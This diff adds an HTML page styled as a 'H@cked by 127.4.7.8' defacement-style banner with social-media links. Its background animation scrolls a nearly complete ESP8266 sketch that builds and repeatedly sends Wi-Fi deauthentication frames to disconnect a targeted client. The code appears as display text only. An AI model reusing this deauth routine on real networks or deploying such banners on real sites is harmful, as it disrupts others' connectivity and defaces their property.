@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>H@cked by 127.4.7.8</title>
+  <style>
+    body {
+      background-color: black;
+      color: #00ff00;
+      font-family: 'Courier New', Courier, monospace;
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 3rem;
+      margin-bottom: 20px;
+      animation: typing 4s steps(30) 1s forwards;
+      white-space: nowrap;
+      overflow: hidden;
+    }
+
+    p {
+      font-size: 1.5rem;
+      margin-top: 0;
+      animation: typing 5s steps(35) 2s forwards;
+      white-space: nowrap;
+      overflow: hidden;
+    }
+
+    @keyframes typing {
+      0% { width: 0; }
+      100% { width: 100%; }
+    }
+
+    .buttons {
+      margin-top: 40px;
+    }
+
+    .btn {
+      background-color: #00ff00;
+      color: black;
+      font-size: 1rem;
+      border: 2px solid #00ff00;
+      padding: 10px 20px;
+      margin: 10px;
+      text-decoration: none;
+      display: inline-block;
+      cursor: pointer;
+      border-radius: 5px;
+      opacity: 0;
+      animation: fadeIn 1s forwards;
+    }
+
+    .btn:nth-child(1) {
+      animation-delay: 4s;
+    }
+
+    .btn:nth-child(2) {
+      animation-delay: 5s;
+    }
+
+    .btn:nth-child(3) {
+      animation-delay: 6s;
+    }
+
+    @keyframes fadeIn {
+      0% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+
+    .background {
+      position: absolute;
+      top: 0;
+      left: 0;
+
+      width: 100%;
+      height: 100%;
+      background-color: black;
+      color: green;
+      font-family: 'Courier New', Courier, monospace;
+      z-index: -1;
+      overflow: hidden;
+    }
+
+    .background span {
+      position: absolute;
+      animation: scrollingText 20s linear infinite;
+      font-size: 20px;
+      white-space: nowrap;
+      left: 0;
+    }
+
+    @keyframes scrollingText {
+      0% { transform: translateY(100vh); }
+      100% { transform: translateY(-100vh); }
+    }
+  </style>
+</head>
+<body>
+  <h1>Hey You!!!</h1>
+  <p>Your H@cked by 127.4.7.8</p>
+
+  <div class="buttons">
+    <a href="https://dev-0618.github.io/127.4.7.8" class="btn" target="_blank">GitHub</a>
+    <a href="https://instagram.com/127.4.7.8" class="btn" target="_blank">Instagram</a>
+    <a href="https://linkedin.com/in/dev0root" class="btn" target="_blank">LinkedIn</a>
+  </div>
+
+  <div class="background"></div>
+
+  <script>
+    const echoMessages = [
+      "#include <ESP8266WiFi.h>",
+      "#include <WiFiClient.h>",
+      "",
+      "// Replace with the MAC addresses of your target and access point",
+      "uint8_t apMAC[] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};   // Replace with your AP MAC",
+      "uint8_t targetMAC[] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66}; // Replace with your client's MAC",
+      "",
+      "void setup() {",
+      "  Serial.begin(115200);",
+      "  Serial.println('Starting Deauth Pentest...');",
+      "",
+      "// Set Wi-Fi to Station mode and enable promiscuous mode",
+      "  wifi_set_opmode(STATION_MODE);",
+      "  wifi_promiscuous_enable(1);",
+      "",
+      "  Serial.println('Monitor mode enabled. Sending deauthentication frames...');",
+      "}",
+      "",
+      "void loop() {",
+      "  sendDeauthFrames(apMAC, targetMAC); // Deauth the target",
+      "  delay(5000); // Wait before sending again (to avoid flooding)",
+      "}",
+      "",
+      "void sendDeauthFrames(uint8_t *ap, uint8_t *target) {",
+      "  uint8_t deauthPacket[26] = {",
+      "    0xC0, 0x00,              // Frame Control (Deauthentication)",
+      "    0x00, 0x00,              // Duration",
+      "    target[0], target[1], target[2], target[3], target[4], target[5], // Destination (Target)",
+      "    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],                         // Source (AP)",
+      "    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],                         // BSSID",
+      "    0x00, 0x00               // Sequence Number",
+      "  };",
+      "",
+      "  // Send the packet multiple times for testing",
+      "  for (int i = 0; i < 10; i++) {",
+      "    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);",
+      "    Serial.printf('Deauth packet %d sent to target %02X:%02X:%02X:%02X:%02X:%02X',",
+      "      i + 1, target[0], target[1], target[2], target[3], target[4], target[5]);",
+      "    delay(100); // Slight delay between packets",
+      "  }",
+      "}",
+    ];
+
+    const background = document.querySelector('.background');
+
+    echoMessages.forEach((message, index) => {
+      const span = document.createElement('span');
+      span.innerText = message;
+      span.style.animationDelay = `${index * 0.25}s`;
+      span.style.top = `${index * 18}px`;
+      
+      background.appendChild(span);
+    });
+  </script>
+</body>
+</html>
+
